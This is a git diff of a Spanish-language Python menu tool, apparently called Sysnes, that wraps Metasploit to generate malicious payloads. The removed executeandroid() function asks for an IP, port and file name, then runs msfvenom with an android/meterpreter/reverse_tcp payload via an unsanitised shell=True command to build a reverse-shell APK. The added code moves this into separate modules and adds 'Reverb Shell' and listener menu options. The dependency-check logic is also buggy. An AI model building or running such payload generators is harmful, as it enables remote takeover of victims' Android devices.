@@ -6,160 +6,107 @@ import platform
 import time
 import sys
 
-def Limpiar():
-    sistema = platform.system()
-    if sistema == "Windows":
-        os.system("cls")
-    elif sistema == "Linux":
-        subprocess.run(["clear"])
-    else:
-        print("Este Sistema No Posee Mas Soporte")
-
-def lapzo():
-    tiempo = 3
-    time.sleep(tiempo)
-
+def clear():
+    from Scritps.Animations import Limpiar
+    Limpiar()
+def reverse():
+    from Scritps.Animations import lapzo
+    lapzo()
 def Barra(desc):
     lista_de_elementos = range(100)
     for elemento in tqdm(lista_de_elementos, desc):
         time.sleep(0.1)
-    
 
-def check_metasploit():
-    try:
-        subprocess.check_call(["which", "msfconsole"])
-        subprocess.check_call(["which", "msfvenom"])
-        return True
-    except subprocess.CalledProcessError:
-        return False
+
+
+def RelMetasploit():
+   from Scritps.Metasploit import check_metasploit
+   check_metasploit()
     
-def check_tqdm():
-    try:
-        import tqdm
-        return True
-    except ImportError:
-        return False
+def Reltqdm():
+    from Scritps.LibreriasPY import check_tqdm
+    check_tqdm()
     
-def instalar_metasploit():
-    try:
-        comando = "sudo apt install metasploit-framework"
-        resultado = subprocess.run(comando, shell=True, check=True, capture_output=True, text=True)
-        print("Metasploit se ha instalado correctamente.")
-        return True
-    except subprocess.CalledProcessError as e:
-        print(f"Error al instalar Metasploit: {e}")
-        return False
+def installerMetasploit():
+    from Scritps.Metasploit import instalar_metasploit
+    instalar_metasploit()
     
-def instalar_tqdm():
-    try:
-        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'tqdm'])
-        print("tqdm se ha instalado correctamente.")
-    except subprocess.CalledProcessError as e:
-        print(f"Error al instalar tqdm: {e}")
-    except Exception as e:
-        print(f"Se ha producido un error inesperado: {e}")
+def installertqdm():
+    from Scritps.LibreriasPY import instalar_tqdm
+    instalar_tqdm()
     
 
 
-def Dependencias():
-    print("Comprobando dependencias Instaladas")
-    lapzo()
+def ChequerUpdate():
+    print("Comprobando dependencias Instaladas ---")
+    reverse()
 
-    print("Verificando La Herramienta Metasploit")
-    check_metasploit()
-    lapzo()
+    print("Verificando La Herramienta Metasploit ---")
+    RelMetasploit()
+    reverse()
 
-    print("Verificando la Dependencia MSFVenom")
-    lapzo()
+    print("Verificando la Dependencia MSFVenom ---")
+    reverse()
     
-    print("Verificando la Libreria tqdm")
-    if not check_tqdm():
-        print("La Libreria de Python tqdm, no se encuentra instalada..")
-        od = input("¿Desea Instalarla Ahora? Y/N ")
-        if od == "N" or "n":
-            print("Error. No se Puede Continuar Con La Ejecucion del Playload")
-            print("Descarge las Dependencias Requeridas. Error 80004001")
-            input("Presione Enter Para Continuar... ")
-        else:
-            print("Iniciando Descarga De la Libreria...")
-            instalar_tqdm()
-            if instalar_tqdm():
-                Barra(desc="Verificando La Instalacion:")
-                print("Se Puede Proceder Con La Ejecucion del Playload")
+    print("Verificando la Libreria tqdm ---")
+    Reltqdm()
+
+    if (not Reltqdm()) or (not RelMetasploit()):
+        if not Reltqdm():
+            print("La Libreria de Python tqdm, no se encuentra instalada..")
+            od = input("¿Desea Instalarla Ahora? Y/N ")
+            if od == "N" or "n":
+                print("Error. No se Puede Continuar Con La Ejecucion del Playload")
+                print("Descarge las Dependencias Requeridas. Error 80004001")
+                input("Presione Enter Para Continuar... ")
+                
+            else:
+                print("Iniciando Descarga De la Libreria...")
+                installertqdm()
+                if installertqdm():
+                    Barra(desc="Verificando La Instalacion:")
+                    print("Se Puede Proceder Con La Ejecucion del Playload")
+                    input("Presione Enter Para Continuar... ")
+                    clear()
+                    ChequerUpdate()
+                else:
+                    print("La instalación de Metasploit falló. Error 710048005")
+        
+        elif not RelMetasploit():
+            print("msfvenom - Metasploit no está instalado en el sistema.")
+            opd = input("¿Desea Instalarlo Ahora? Y/N ")
+            if opd == "N" or "n":
+                print("Error. No se Puede Continuar Con La Ejecucion del Playload")
+                print("Descarge las Dependencias Requeridas. Error 80004001")
                 input("Presione Enter Para Continuar... ")
             else:
-                print("La instalación de Metasploit falló. Error 710048005")
-    lapzo()
-    
-    if check_metasploit():
-        print("msfvenom - Metasploit está instalado en el sistema.")
-        input("\nPresione Enter Para Continuar.. ")
-        executeandroid()
+                print("Iniciando Descarga De Dependencias...")
+                installerMetasploit()
+                if installerMetasploit():
+                    Barra(desc="Verificando La Instalacion:")
+                    print("\nAhora puedes utilizar Metasploit.")
+                    print("Se Puede Proceder Con La Ejecucion del Playload")
+                    input("Presione Enter Para Continuar... ")
+                    clear()
+                    ChequerUpdate()
+                else:
+                    print("La instalación de Metasploit falló. Error 710048005")
+
     else:
-        print("msfvenom - Metasploit no está instalado en el sistema.")
-        opd = input("¿Desea Instalarlo Ahora? Y/N ")
-        if opd == "N" or "n":
-            print("Error. No se Puede Continuar Con La Ejecucion del Playload")
-            print("Descarge las Dependencias Requeridas. Error 80004001")
-            input("Presione Enter Para Continuar... ")
-        else:
-            print("Iniciando Descarga De Dependencias...")
-            instalar_metasploit()
-            if instalar_metasploit():
-                Barra(desc="Verificando La Instalacion:")
-                print("\nAhora puedes utilizar Metasploit.")
-                print("Se Puede Proceder Con La Ejecucion del Playload")
-                input("Presione Enter Para Continuar... ")
-                executeandroid()
-            else:
-                print("La instalación de Metasploit falló. Error 710048005")
+        print("Todas Las Librerias Y Dependencias Estan Corretamente Habilitadas")
+        print("Se Puede Proceder con la Ejecucion del Payload")
+        reverse()
+        
+
+    
+def Opc_1():
+    from Tools.CreateAndroid import ToolCreatorAndroid
+    ToolCreatorAndroid()
 
 
-def executeandroid():
-    Limpiar()
-    Barra(desc="Iniciando la Ejecucion: ")
-    print("\nEjecucion del Payload Completada...")
-    print("A Continuacion, Se Completara La Creacion De La Apk\n")
-    ip = input("Proporcione Su Direccion IP: \n")
-    lop = input("Su direccion IP:" + str(ip) + " ¿Es Correcta? (y/n): ")
-    while lop == "n":
-        ip = input("Proporcione Su Direccion IP Nuevamente: \n")
-        lop = input("Su direccion IP:" + str(ip) + " ¿Es Correcta? (y/n): ")
-    Limpiar()
-    print(f"Direccion IP ({ip}) Establecida Correctamente...\n")
-
-    port = int(input("Proporcione un Puerto de Escucha: "))
-    print(f"El Puerto de Escucha (" + str(port) + ") Se ha Establecido Correctamente..\n")
-    Limpiar()
-
-    print("** Terminando La Creacion del APK ** ")
-    name = input("Ingrese el Nombre del Archivo .Apk: ")
-    print(f"Se Ha establecido El Nombre del Archivo ({name}.apk) Correctamente! ")
-    Limpiar()
-    Barra(desc="Creando Archivo .Apk")
-
-    try:
-        comando = "msfvenom -p android/meterpreter/reverse_tcp LHOST="+ ip + " LPORT="+ str(port) + " -o " + name +".apk"
-        resultado = subprocess.run(comando, shell=True, check=True, capture_output=True, text=True)
-        print("Se Ha Creado El Archivo .APK Correctamente\n")
-        print("*** Informacion Y Detalles ***")
-        print(f"Name:{name}.apk")
-        print(f"IP: {ip}")
-        print(f"PORT: {port}")
-        input("\nPresione Enter Para Finalizar... ")
-        Main()
-
-        return True
-    except subprocess.CalledProcessError as e:
-        print(f"Error al Crear El Archivo :( {e}")
-        input("\nPresione Enter Para Finalizar... ")
-        Main()
-        return False
-
-
-def Main():
-    Limpiar()
-    print("\n")
+def Main():
+    clear()
+    print("\nPyload Creado Por NesAnTime\n")
     print("  ██████▓██   ██▓  ██████  ███▄    █ ▓█████   ██████")
     print("▒██    ▒ ▒██  ██▒▒██    ▒  ██ ▀█   █ ▓█   ▀ ▒██    ▒")
     print("░ ▓██▄    ▒██ ██░░ ▓██▄   ▓██  ▀█ ██▒▒███   ░ ▓██▄  ")
@@ -170,26 +117,44 @@ def Main():
     print("░  ░  ░  ▒ ▒ ░░  ░  ░  ░     ░   ░ ░    ░   ░  ░  ░  ")
     print("      ░  ░ ░           ░           ░    ░  ░      ░  ")
     print("         ░ ░                                         ")
-    print("\nPyload Creado Por NesAnTime\n")
+    print("\nTodos Los Derechos Reservados (Version 1.24)\n")
 
-    print("--- Menu De Opciones ---")
-    print("1. Crear Archivo (.Apk) (Version Rapida)")
-    print("2. Crear Archivo (.Exe o .msi) (Beta)")
-    print("3. Crear Comando PowerShell (Windows) (Beta)")
-    print("4. Cerrar El Payload\n")
-
+    print("__________ Menu De Opciones __________")
+    print("1. Crear Software (Reverb Shell)")
+    print("2. Iniciar Modo ROOT (En Espera de Reverb Shell)\n")
+    print("3. Cerrar Sysnes")
     opc = int(input("Ingrese La Opcion: "))
-    while (opc < 1) or (opc > 4):
+    while (opc < 1) or (opc > 3):
         print("Error. La Opcion No esta Disponible :(")
         opc = int(input("Ingrese Nuevamente La Opcion: "))
-        
-    if opc == 1:
-        Limpiar()
-        Dependencias()
-    elif opc == 2:
-        print("Hasta Ahora Es una Version Beta En Desarrollo (No Disponible)")
-    elif opc == 3:
-        print("Hasta Ahora Es una Version Beta En Desarrollo (No Disponible)")
+
+    if (opc == 1):
+        print(" Creacion de Software (Version 1.2)\n")
+        print("\n")
+        print("\n---------- ¿Que Operacion Desea Realizar? ----------\n")
+        print("1. Crear Archivo (.Apk) (Alfha v1)")
+        print("2. Crear Archivo (.Exe o .msi) (Beta v-0)")
+        print("3. Crear Comando PowerShell (Windows) (Beta v-0)")
+        print("4. Atras\n")
+        opc1 = int(input("Ingrese La Opcion: "))
+        while (opc1 < 1) or (opc1 > 4):
+            print("Error. La Opcion No esta Disponible :(")
+            opc1 = int(input("Ingrese Nuevamente La Opcion: "))
+        if opc1 == 1:
+            clear()
+            Opc_1()
+        elif opc1 == 2:
+            print("Hasta Ahora Es una Version Beta En Desarrollo (No Disponible)")
+        elif opc1 == 3:
+            print("Hasta Ahora Es una Version Beta En Desarrollo (No Disponible)")
+        else: 
+            Main()
+
+    elif (opc == 2):
+        print("Modo En Desarrallo :) ")
+        input()
+        Main()
+
     else:
         print("Programa Finalizado...")
 
